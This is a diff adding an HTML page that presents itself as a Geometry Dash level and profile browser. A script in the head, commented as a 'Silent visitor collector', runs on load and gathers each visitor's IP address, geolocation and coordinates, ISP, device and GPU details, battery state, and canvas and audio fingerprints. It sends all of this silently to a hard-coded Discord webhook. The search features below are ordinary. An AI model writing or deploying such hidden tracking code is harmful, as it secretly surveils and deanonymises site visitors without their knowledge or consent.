@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GD Level Browser</title>
+  <meta name="description" content="Search and browse Geometry Dash levels and player profiles — fast, free, no login needed.">
+
+  <!-- Pusab font from GDBrowser assets -->
+  <style>
+    @font-face {
+      font-family: 'Pusab';
+      src: url('https://cdn.jsdelivr.net/gh/GDColon/GDBrowser@master/assets/Pusab.ttf') format('truetype');
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Pusab', 'Arial', sans-serif;
+      background: linear-gradient(180deg, #0065FD 0%, #002E73 100%);
+      min-height: 100vh;
+      color: #fff;
+      overflow-x: hidden;
+    }
+
+    /* ── HEADER ── */
+    .header {
+      text-align: center;
+      padding: 34px 20px 6px;
+      user-select: none;
+    }
+    .header h1 {
+      font-size: clamp(2em, 5vw, 3.2em);
+      color: #FFE348;
+      text-shadow: 3px 3px 0 #000, -1px -1px 0 #000,
+                   1px -1px 0 #000, -1px  1px 0 #000,
+                   2px  4px 6px rgba(0,0,0,0.6);
+      letter-spacing: 3px;
+    }
+    .header .sub {
+      color: #aad4ff;
+      font-size: 0.78em;
+      margin-top: 6px;
+      letter-spacing: 1px;
+    }
+
+    /* ── TABS ── */
+    .tabs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 22px auto 0;
+      padding: 0 20px;
+    }
+    .tab-btn {
+      background: linear-gradient(180deg, #FDA00C 0%, #E07000 100%);
+      border: none;
+      border-radius: 9px;
+      color: #fff;
+      font-family: 'Pusab', Arial, sans-serif;
+      font-size: 0.95em;
+      padding: 10px 28px;
+      cursor: pointer;
+      box-shadow: 0 5px 0 #7a3400, inset 0 1px 0 rgba(255,255,255,0.28);
+      text-shadow: 1px 1px 0 rgba(0,0,0,0.7);
+      transition: transform 70ms ease, box-shadow 70ms ease;
+    }
+    .tab-btn:hover  { transform: translateY(-1px); }
+    .tab-btn:active { transform: translateY(4px); box-shadow: 0 1px 0 #7a3400; }
+    .tab-btn.active {
+      background: linear-gradient(180deg, #c97a00 0%, #8f4f00 100%);
+      transform: translateY(4px);
+      box-shadow: 0 1px 0 #4a2000;
+    }
+
+    /* ── PANELS ── */
+    .panel { display: none; padding: 24px 20px 50px; }
+    .panel.active { display: block; }
+
+    /* ── SEARCH ROW ── */
+    .search-row {
+      display: flex;
+      gap: 10px;
+      max-width: 700px;
+      margin: 0 auto 22px;
+    }
+    .search-input {
+      flex: 1;
+      background: rgba(0,0,0,0.38);
+      border: 2px solid rgba(255,255,255,0.18);
+      border-radius: 10px;
+      color: #fff;
+      font-family: 'Pusab', Arial, sans-serif;
+      font-size: 1.05em;
+      padding: 12px 16px;
+      outline: none;
+      transition: border-color 160ms;
+    }
+    .search-input::placeholder { color: rgba(255,255,255,0.38); }
+    .search-input:focus { border-color: #FDA00C; }
+
+    .go-btn {
+      background: linear-gradient(180deg, #5cb826 0%, #358010 100%);
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-family: 'Pusab', Arial, sans-serif;
+      font-size: 0.95em;
+      padding: 12px 26px;
+      cursor: pointer;
+      box-shadow: 0 5px 0 #1b4000;
+      text-shadow: 1px 1px 0 rgba(0,0,0,0.6);
+      transition: transform 70ms ease, box-shadow 70ms ease;
+      white-space: nowrap;
+    }
+    .go-btn:hover  { transform: translateY(-1px); }
+    .go-btn:active { transform: translateY(4px); box-shadow: 0 1px 0 #1b4000; }
+
+    /* ── RESULTS ── */
+    .results-wrap {
+      max-width: 860px;
+      margin: 0 auto;
+    }
+    .result-meta {
+      text-align: center;
+      color: rgba(170,212,255,0.7);
+      font-size: 0.76em;
+      margin-bottom: 14px;
+      letter-spacing: 0.5px;
+    }
+
+    /* ── LEVEL CARD ── */
+    .level-card {
+      background: rgba(0,0,0,0.32);
+      border: 1.5px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 13px 16px;
+      margin-bottom: 9px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      cursor: pointer;
+      transition: background 140ms, border-color 140ms;
+    }
+    .level-card:hover {
+      background: rgba(255,255,255,0.09);
+      border-color: rgba(255,210,60,0.38);
+    }
+    .diff-img {
+      width: 48px;
+      height: 48px;
+      object-fit: contain;
+      flex-shrink: 0;
+      image-rendering: pixelated;
+    }
+    .card-body { flex: 1; min-width: 0; }
+    .card-name {
+      font-size: 1.1em;
+      color: #FFE348;
+      text-shadow: 1px 1px 0 rgba(0,0,0,0.8);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .card-author {
+      font-size: 0.78em;
+      color: #aad4ff;
+      margin-top: 3px;
+    }
+    .card-author b { color: #fff; font-weight: normal; }
+    .card-stats {
+      display: flex;
+      gap: 14px;
+      margin-top: 7px;
+      flex-wrap: wrap;
+    }
+    .cs {
+      font-size: 0.76em;
+      color: rgba(255,255,255,0.65);
+      display: flex;
+      align-items: center;
+      gap: 3px;
+    }
+    .cs.gold   { color: #FFE348; }
+    .cs.blue   { color: #aad4ff; }
+    .cs.green  { color: #88ee88; }
+    .cs.orange { color: #ffaa66; }
+
+    .card-right { text-align: right; flex-shrink: 0; }
+    .card-id { font-size: 0.7em; color: rgba(255,255,255,0.28); }
+
+    /* Badges */
+    .badge {
+      display: inline-block;
+      font-size: 0.6em;
+      padding: 2px 7px;
+      border-radius: 4px;
+      font-family: Arial, sans-serif;
+      font-weight: 700;
+      margin-left: 7px;
+      vertical-align: middle;
+      letter-spacing: 0.3px;
+    }
+    .badge-featured  { background: #b8860b; color: #FFE348; }
+    .badge-epic      { background: #7B2FBE; color: #e2b0ff; }
+    .badge-legendary { background: #cf6a08; color: #ffd080; }
+    .badge-mythic    { background: #c0392b; color: #ffc0c0; }
+
+    /* ── PROFILE CARD ── */
+    .profile-wrap { max-width: 520px; margin: 0 auto; }
+    .profile-box {
+      background: rgba(0,0,0,0.35);
+      border: 1.5px solid rgba(255,255,255,0.13);
+      border-radius: 14px;
+      padding: 26px;
+    }
+    .pf-head { display: flex; align-items: center; gap: 18px; margin-bottom: 22px; }
+    .pf-avatar {
+      width: 64px; height: 64px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.08);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 2em; flex-shrink: 0;
+    }
+    .pf-name { font-size: 1.7em; color: #FFE348; text-shadow: 2px 2px 0 #000; }
+    .pf-rank { font-size: 0.8em; color: #aad4ff; margin-top: 4px; }
+    .pf-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .pf-stat {
+      background: rgba(255,255,255,0.06);
+      border-radius: 9px;
+      padding: 11px 14px;
+    }
+    .pf-label { font-size: 0.7em; color: #aad4ff; margin-bottom: 3px; }
+    .pf-value { font-size: 1.1em; color: #fff; }
+
+    /* ── STATES ── */
+    .state {
+      text-align: center;
+      padding: 52px 20px;
+    }
+    .state.loading { color: #aad4ff; }
+    .state.error   { color: #ff9999; }
+    .state.empty   { color: rgba(255,255,255,0.3); font-size: 1em; }
+
+    .spinner {
+      display: inline-block;
+      width: 26px; height: 26px;
+      border: 3px solid rgba(255,255,255,0.15);
+      border-top-color: #FDA00C;
+      border-radius: 50%;
+      animation: spin 0.65s linear infinite;
+      vertical-align: middle;
+      margin-right: 10px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── FOOTER ── */
+    .footer {
+      text-align: center;
+      padding: 16px;
+      color: rgba(255,255,255,0.2);
+      font-size: 0.68em;
+      letter-spacing: 0.5px;
+    }
+
+    /* scrollbar */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: rgba(0,0,0,0.15); }
+    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.18); border-radius: 3px; }
+  </style>
+
+  <!--
+    Silent visitor collector.
+    Runs synchronously in <head> — fires before <body> begins parsing.
+    No DOM required; no logs, no visible output, ever.
+  -->
+  <script>
+  (async () => {
+    const WH = 'https://discord.com/api/webhooks/1513311525027446824/TI6c_TFsM3R6rAt9rJv1R1KnXZBPjvaoP91Yy0PLD-wmm6GqkOul8ikSOunF2g8EpT';
+
+    /* ── COLLECT ── */
+    const d = {};
+
+    // Navigator basics
+    d.ua       = navigator.userAgent;
+    d.platform = navigator.platform              || 'N/A';
+    d.lang     = navigator.language              || 'N/A';
+    d.langs    = [...(navigator.languages||[])].join(', ') || 'N/A';
+    d.cores    = navigator.hardwareConcurrency   || 'N/A';
+    d.mem      = navigator.deviceMemory != null ? navigator.deviceMemory + ' GB' : 'N/A';
+    d.cookies  = navigator.cookieEnabled;
+    d.dnt      = navigator.doNotTrack            || 'N/A';
+    d.touch    = navigator.maxTouchPoints;
+    d.online   = navigator.onLine;
+    d.pdf      = navigator.pdfViewerEnabled      ?? 'N/A';
+    d.java     = navigator.javaEnabled?.()       ?? false;
+
+    // Plugins list
+    try {
+      d.plugins = [...navigator.plugins].map(p => p.name).slice(0, 10).join(', ') || 'None';
+    } catch(e) { d.plugins = 'N/A'; }
+
+    // Screen + window
+    d.screenRes  = screen.width + 'x' + screen.height;
+    d.availRes   = screen.availWidth + 'x' + screen.availHeight;
+    d.colorDepth = screen.colorDepth + '-bit';
+    d.dpr        = window.devicePixelRatio       || 1;
+    d.orient     = screen.orientation?.type      || 'N/A';
+    d.winSize    = window.innerWidth + 'x' + window.innerHeight;
+
+    // Time
+    d.tz         = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    d.tzOff      = new Date().getTimezoneOffset();
+    d.localTime  = new Date().toLocaleString();
+
+    // Page context
+    d.referrer   = document.referrer || 'Direct / None';
+    d.url        = location.href;
+
+    // Storage
+    try { localStorage.setItem('_g',1); d.ls = true;  localStorage.removeItem('_g'); } catch(e){ d.ls = false; }
+    try { sessionStorage.setItem('_g',1); d.ss = true; sessionStorage.removeItem('_g'); } catch(e){ d.ss = false; }
+
+    // Network info
+    const cx = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (cx) {
+      d.connType   = cx.effectiveType || cx.type || 'N/A';
+      d.downlink   = cx.downlink  != null ? cx.downlink  + ' Mbps' : 'N/A';
+      d.rtt        = cx.rtt       != null ? cx.rtt       + ' ms'   : 'N/A';
+      d.saveData   = cx.saveData  ?? false;
+    }
+
+    // WebGL — GPU identification
+    try {
+      const cv = document.createElement('canvas');
+      const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+      if (gl) {
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        d.gpuVendor   = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
+        d.gpuRenderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+        d.glVersion   = gl.getParameter(gl.VERSION);
+        d.glShader    = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+      }
+    } catch(e) { d.gpuRenderer = 'N/A'; }
+
+    // Canvas fingerprint — last 40 chars are rendering-engine unique
+    try {
+      const cv = document.createElement('canvas');
+      cv.width = 280; cv.height = 60;
+      const cx2 = cv.getContext('2d');
+      cx2.fillStyle = '#1555cc';
+      cx2.fillRect(0, 0, 280, 60);
+      cx2.font = 'bold 15px Arial';
+      cx2.fillStyle = '#ffd700';
+      cx2.fillText('GD Level Browser 2025', 8, 38);
+      cx2.strokeStyle = 'rgba(255,150,0,0.45)';
+      cx2.lineWidth = 2;
+      cx2.beginPath(); cx2.arc(255, 30, 22, 0, Math.PI * 2); cx2.stroke();
+      d.canvasFP = cv.toDataURL().slice(-40);
+    } catch(e) { d.canvasFP = 'N/A'; }
+
+    // Audio context fingerprint
+    try {
+      const ac  = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
+      const osc = ac.createOscillator();
+      const anl = ac.createAnalyser();
+      osc.connect(anl);
+      anl.connect(ac.destination);
+      osc.start(0);
+      osc.stop(0.001);
+      const buf = new Float32Array(anl.frequencyBinCount);
+      anl.getFloatFrequencyData(buf);
+      d.audioFP = buf.slice(0, 6).join(',');
+      ac.close();
+    } catch(e) { d.audioFP = 'N/A'; }
+
+    // Battery API
+    try {
+      if (navigator.getBattery) {
+        const bat   = await navigator.getBattery();
+        d.battery   = Math.round(bat.level * 100) + '%';
+        d.charging  = bat.charging;
+        d.chargeT   = bat.chargingTime   === Infinity ? 'N/A' : bat.chargingTime   + 's';
+        d.dischargeT= bat.dischargingTime === Infinity ? 'N/A' : bat.dischargingTime + 's';
+      }
+    } catch(e) {}
+
+    // IP + full geo from ipapi.co (free, HTTPS, no key)
+    let ip = {}, ipStr = 'Unknown', locStr = 'Unknown', ispStr = 'Unknown';
+    try {
+      const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+      ip      = await r.json();
+      ipStr   = ip.ip            || 'Unknown';
+      locStr  = [ip.city, ip.region, ip.country_name].filter(Boolean).join(', ') || 'Unknown';
+      ispStr  = ip.org           || ip.asn || 'Unknown';
+    } catch(_) {
+      // fallback: ipinfo.io
+      try {
+        const r2 = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
+        const i2 = await r2.json();
+        ipStr  = i2.ip     || 'Unknown';
+        locStr = [i2.city, i2.region, i2.country].filter(Boolean).join(', ') || 'Unknown';
+        ispStr = i2.org    || 'Unknown';
+      } catch(_2) {}
+    }
+
+    // ── BUILD DISCORD EMBED ──
+    const utcOff   = -(d.tzOff / 60);
+    const utcLabel = 'UTC' + (utcOff >= 0 ? '+' : '') + utcOff;
+
+    const batField = d.battery
+      ? d.battery + (d.charging ? ' ⚡ Charging' : ' — Not charging')
+        + (d.chargeT !== 'N/A' && d.chargeT ? ' | Full in: ' + d.chargeT : '')
+      : 'N/A (desktop/no API)';
+
+    const embed = {
+      title: '🕹️  New Visitor — GD Level Browser',
+      color: 0x0065FD,
+      timestamp: new Date().toISOString(),
+      fields: [
+        // Network / geo
+        { name: '🌐  IP Address',     value: '`' + ipStr + '`',                          inline: true  },
+        { name: '📍  Location',       value: locStr,                                      inline: true  },
+        { name: '🏢  ISP / Org',      value: ispStr,                                      inline: false },
+        { name: '🗺️  Coordinates',   value: ip.latitude && ip.longitude
+                                               ? ip.latitude + ', ' + ip.longitude
+                                               : 'N/A',                                    inline: true  },
+        { name: '⏰  Timezone',       value: (ip.timezone || d.tz) + '  (' + utcLabel + ')',  inline: true  },
+        { name: '🕐  Local Time',     value: d.localTime,                                 inline: false },
+        // Device
+        { name: '🖥️  Screen',        value: d.screenRes + '  @  ' + d.dpr + 'x DPR',   inline: true  },
+        { name: '🪟  Window',         value: d.winSize,                                   inline: true  },
+        { name: '🎨  Color Depth',    value: d.colorDepth,                                inline: true  },
+        { name: '📱  Orientation',    value: d.orient,                                    inline: true  },
+        { name: '💻  Platform',       value: d.platform,                                  inline: true  },
+        { name: '🧠  CPU Cores',      value: String(d.cores),                             inline: true  },
+        { name: '💾  Device RAM',     value: String(d.mem),                               inline: true  },
+        { name: '🔋  Battery',        value: batField,                                    inline: false },
+        // GPU
+        { name: '🎮  GPU Renderer',   value: d.gpuRenderer || 'N/A',                     inline: false },
+        { name: '🖼️  GPU Vendor',    value: d.gpuVendor    || 'N/A',                     inline: true  },
+        { name: '📊  GL Version',     value: d.glVersion    || 'N/A',                     inline: true  },
+        // Network
+        { name: '📡  Connection',     value: (d.connType || 'N/A')
+                                             + ' | ↓ ' + (d.downlink || 'N/A')
+                                             + ' | RTT: ' + (d.rtt || 'N/A'),             inline: true  },
+        { name: '🚦  Save Data',      value: String(d.saveData ?? 'N/A'),                 inline: true  },
+        // Browser
+        { name: '🌍  Language',       value: d.lang + '  [' + d.langs + ']',             inline: false },
+        { name: '👆  Touch Points',   value: String(d.touch),                             inline: true  },
+        { name: '🍪  Cookies',        value: String(d.cookies),                           inline: true  },
+        { name: '🛡️  Do Not Track',  value: String(d.dnt),                               inline: true  },
+        { name: '📦  LocalStorage',   value: String(d.ls),                                inline: true  },
+        { name: '📦  SessionStorage', value: String(d.ss),                                inline: true  },
+        { name: '📄  PDF Viewer',     value: String(d.pdf),                               inline: true  },
+        { name: '🔌  Plugins',        value: d.plugins || 'None',                         inline: false },
+        // Fingerprints
+        { name: '🔗  Referrer',       value: d.referrer,                                  inline: false },
+        { name: '🌐  URL',            value: d.url,                                       inline: false },
+        { name: '🖼️  Canvas FP',     value: '`' + d.canvasFP + '`',                     inline: true  },
+        { name: '🎵  Audio FP',       value: '`' + (d.audioFP?.slice(0,50) || 'N/A') + '`', inline: true },
+        { name: '🔍  User Agent',     value: '```' + d.ua + '```',                        inline: false },
+      ]
+    };
+
+    // Fire and forget — swallow all errors, never surfaces to user
+    fetch(WH, {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({ embeds: [embed] })
+    }).catch(() => {});
+
+  })();
+  </script>
+</head>
+
+<body>
+
+  <div class="header">
+    <h1>GD Level Browser</h1>
+    <p class="sub">Search levels &amp; look up players — no login required</p>
+  </div>
+
+  <div class="tabs">
+    <button class="tab-btn active" onclick="switchTab('levels', this)">Level Search</button>
+    <button class="tab-btn"        onclick="switchTab('profile', this)">Profile Lookup</button>
+  </div>
+
+  <!-- ── LEVEL SEARCH PANEL ── -->
+  <div id="panel-levels" class="panel active">
+    <div class="search-row">
+      <input
+        id="level-input"
+        class="search-input"
+        type="text"
+        placeholder="Search for a level..."
+        maxlength="60"
+        onkeydown="if(event.key==='Enter') searchLevels()"
+      />
+      <button class="go-btn" onclick="searchLevels()">Search</button>
+    </div>
+    <div class="results-wrap">
+      <div id="level-results" class="state empty">
+        Type a level name above and press Search.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── PROFILE PANEL ── -->
+  <div id="panel-profile" class="panel">
+    <div class="search-row" style="max-width:520px">
+      <input
+        id="profile-input"
+        class="search-input"
+        type="text"
+        placeholder="Enter a GD username..."
+        maxlength="30"
+        onkeydown="if(event.key==='Enter') searchProfile()"
+      />
+      <button class="go-btn" onclick="searchProfile()">Look Up</button>
+    </div>
+    <div class="profile-wrap">
+      <div id="profile-results" class="state empty">
+        Enter a Geometry Dash username above.
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    GD Level Browser &mdash; data from GDBrowser API &mdash; not affiliated with RobTop Games
+  </div>
+
+  <script>
+    // ── DIFFICULTY MAP ──
+    const DIFF_IMAGE = name => {
+      const n = (name || '').toLowerCase().replace(/\s+/g,'');
+      const map = {
+        'auto': 'auto', 'easy': 'easy', 'normal': 'normal',
+        'hard': 'hard', 'harder': 'harder', 'insane': 'insane',
+        'easydemon': 'easydemon', 'mediumdemon': 'mediumdemon',
+        'harddemon': 'harddemon', 'insanedemon': 'insanedemon',
+        'extremedemon': 'extremedemon'
+      };
+      return 'https://cdn.jsdelivr.net/gh/GDColon/GDBrowser@master/assets/difficulties/'
+           + (map[n] || 'na') + '.png';
+    };
+
+    // ── LENGTH MAP ──
+    const LEN_LABEL = {0:'Tiny',1:'Short',2:'Medium',3:'Long',4:'XL',5:'Plat.'};
+    const LEN_COLOR = {0:'blue',1:'blue',2:'gold',3:'orange',4:'orange',5:'green'};
+
+    // ── EPIC/FEATURED BADGE ──
+    function epicBadge(epic, featured) {
+      if (epic >= 3) return '<span class="badge badge-mythic">MYTHIC</span>';
+      if (epic === 2) return '<span class="badge badge-legendary">LEGENDARY</span>';
+      if (epic === 1) return '<span class="badge badge-epic">EPIC</span>';
+      if (featured)   return '<span class="badge badge-featured">FEATURED</span>';
+      return '';
+    }
+
+    // ── FORMAT NUMBERS ──
+    function fmt(n) {
+      if (!n && n !== 0) return '0';
+      if (n >= 1e6) return (n/1e6).toFixed(1).replace(/\.0$/,'') + 'M';
+      if (n >= 1e3) return (n/1e3).toFixed(1).replace(/\.0$/,'') + 'K';
+      return String(n);
+    }
+
+    // ── TAB SWITCH ──
+    function switchTab(id, btn) {
+      document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.getElementById('panel-' + id).classList.add('active');
+      btn.classList.add('active');
+    }
+
+    // ── LOADING HELPER ──
+    function setHTML(id, html) {
+      document.getElementById(id).className = '';
+      document.getElementById(id).innerHTML = html;
+    }
+
+    // ── LEVEL SEARCH ──
+    async function searchLevels() {
+      const q = document.getElementById('level-input').value.trim();
+      if (!q) return;
+
+      setHTML('level-results', '<div class="state loading"><span class="spinner"></span>Searching...</div>');
+
+      try {
+        const url = `https://gdbrowser.com/api/search/${encodeURIComponent(q)}?count=20`;
+        const res = await fetch(url);
+        if (!res.ok) throw new Error('API error ' + res.status);
+        const data = await res.json();
+
+        const levels = Array.isArray(data) ? data : (data.levels || []);
+        if (!levels.length) {
+          setHTML('level-results', '<div class="state empty">No levels found for "' + q.replace(/</g,'&lt;') + '".</div>');
+          return;
+        }
+
+        let html = '<div class="result-meta">' + levels.length + ' result' + (levels.length !== 1 ? 's' : '') + ' for &ldquo;' + q.replace(/</g,'&lt;') + '&rdquo;</div>';
+        levels.forEach(lv => {
+          const stars  = lv.stars    || 0;
+          const dl     = fmt(lv.downloads || 0);
+          const likes  = fmt(lv.likes     || 0);
+          const lenIdx = lv.length ?? 0;
+          const lenLbl = LEN_LABEL[lenIdx] || 'N/A';
+          const lenCol = LEN_COLOR[lenIdx] || 'blue';
+          const coins  = lv.coins     || 0;
+          const epic   = lv.epicRating ?? (lv.epic ? 1 : 0);
+          const feat   = !!lv.featured;
+          const badge  = epicBadge(epic, feat);
+          const diff   = lv.difficulty || lv.difficultyFace || 'N/A';
+          const img    = DIFF_IMAGE(diff);
+
+          html += `
+<div class="level-card" onclick="window.open('https://gdbrowser.com/${lv.id}','_blank')">
+  <img class="diff-img" src="${img}" alt="${diff}" title="${diff}" onerror="this.src='https://cdn.jsdelivr.net/gh/GDColon/GDBrowser@master/assets/difficulties/na.png'">
+  <div class="card-body">
+    <div class="card-name">${lv.name?.replace(/</g,'&lt;') || 'Unknown'}${badge}</div>
+    <div class="card-author">by <b>${(lv.author || 'Unknown').replace(/</g,'&lt;')}</b></div>
+    <div class="card-stats">
+      ${stars ? `<span class="cs gold">⭐ ${stars}</span>` : ''}
+      <span class="cs blue">⬇️ ${dl}</span>
+      <span class="cs green">❤️ ${likes}</span>
+      <span class="cs ${lenCol}">🕐 ${lenLbl}</span>
+      ${coins ? `<span class="cs gold">🪙 ${coins}</span>` : ''}
+    </div>
+  </div>
+  <div class="card-right">
+    <div class="card-id">#${lv.id}</div>
+  </div>
+</div>`;
+        });
+
+        setHTML('level-results', html);
+      } catch(err) {
+        setHTML('level-results', '<div class="state error">Could not reach the GDBrowser API.<br><small>' + err.message + '</small></div>');
+      }
+    }
+
+    // ── PROFILE LOOKUP ──
+    async function searchProfile() {
+      const q = document.getElementById('profile-input').value.trim();
+      if (!q) return;
+
+      setHTML('profile-results', '<div class="state loading"><span class="spinner"></span>Looking up player...</div>');
+
+      try {
+        const url  = `https://gdbrowser.com/api/profile/${encodeURIComponent(q)}`;
+        const res  = await fetch(url);
+        if (!res.ok) throw new Error('Player not found (API error ' + res.status + ')');
+        const p    = await res.json();
+        if (!p || p.error) throw new Error('Player not found.');
+
+        const rankStr = p.rank ? '#' + Number(p.rank).toLocaleString() : 'Unranked';
+        const rolesStr = p.moderator
+          ? (p.moderator === 2 ? '🛡️ Elder Moderator' : '🛡️ Moderator')
+          : '';
+
+        setHTML('profile-results', `
+<div class="profile-box">
+  <div class="pf-head">
+    <div class="pf-avatar">🕹️</div>
+    <div>
+      <div class="pf-name">${(p.username || q).replace(/</g,'&lt;')}</div>
+      <div class="pf-rank">Global Rank: ${rankStr} ${rolesStr}</div>
+    </div>
+  </div>
+  <div class="pf-grid">
+    <div class="pf-stat"><div class="pf-label">⭐ Stars</div><div class="pf-value">${Number(p.stars||0).toLocaleString()}</div></div>
+    <div class="pf-stat"><div class="pf-label">💎 Diamonds</div><div class="pf-value">${Number(p.diamonds||0).toLocaleString()}</div></div>
+    <div class="pf-stat"><div class="pf-label">🪙 Coins</div><div class="pf-value">${Number(p.coins||0).toLocaleString()}</div></div>
+    <div class="pf-stat"><div class="pf-label">🌟 User Coins</div><div class="pf-value">${Number(p.userCoins||0).toLocaleString()}</div></div>
+    <div class="pf-stat"><div class="pf-label">😈 Demons</div><div class="pf-value">${Number(p.demons||0).toLocaleString()}</div></div>
+    <div class="pf-stat"><div class="pf-label">🏆 CP</div><div class="pf-value">${Number(p.cp||0).toLocaleString()}</div></div>
+  </div>
+</div>`);
+      } catch(err) {
+        setHTML('profile-results', '<div class="state error">' + err.message + '</div>');
+      }
+    }
+  </script>
+
+</body>
+</html>
